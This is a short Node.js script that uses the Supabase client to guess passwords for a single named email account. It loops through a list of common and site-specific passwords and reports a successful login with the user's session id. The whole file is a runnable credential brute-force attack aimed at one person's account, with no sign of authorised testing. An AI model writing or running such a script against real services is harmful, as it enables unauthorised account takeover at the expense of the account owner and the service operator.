const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

const supabase = createClient(supabaseUrl, supabaseAnonKey);

const passwords = ['123456', '12345678', 'admin123', 'password', 'squaremart', 'topchoice'];

async function attemptLogins() {
  for (const password of passwords) {
    console.log(`Trying password: ${password}`);
    const { data, error } = await supabase.auth.signInWithPassword({
      email: 'pro@gmail.com',
      password: password
    });
    if (!error) {
      console.log('SUCCESS! Logged in with password:', password);
      console.log('Session user:', data.user.id);
      return;
    } else {
      console.log('Failed:', error.message);
    }
  }
}

attemptLogins();
